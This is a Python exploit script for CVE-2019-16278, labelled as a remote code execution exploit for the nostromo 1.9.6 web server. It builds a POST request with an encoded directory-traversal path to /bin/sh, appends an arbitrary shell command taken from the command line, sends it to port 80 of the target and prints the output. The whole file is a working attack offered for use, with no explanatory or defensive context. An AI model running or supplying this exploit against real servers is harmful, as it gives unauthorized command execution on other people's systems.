import socket
import pyfiglet
import sys

def banner():
    print(pyfiglet.figlet_format("cve-2019-16278", font="slant"))
    print("[+] nostromo 1.9.6 - Remote Code Execution by GoAnalog14")

def create_payload(cmd):
    print("[+] Create payload ...")
    payload = "POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\n"
    payload += "Content-Length: 1\r\n\r\necho\necho\n"
    payload += f"{cmd} 2>&1"
    return payload

def exploit(url,cmd):
    payload = create_payload(cmd)

    print("[+] Exploiting ...")
    
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((url,80))
    s.send(payload.encode('utf-8'))
    receive = s.recv(4096)
    lines = receive.decode().split("\n")
    index = lines.index('\r')
    output = "\n".join(lines[index+1:])
    print(output)
    s.close()
    
    
    

if __name__ == "__main__":
   
    if len(sys.argv) != 3:
        print("Usage: python3 cve-2019-16278.py <url> <cmd>")
        sys.exit(1)

    banner()
    url = sys.argv[1]
    cmd = sys.argv[2]
    exploit(url,cmd)
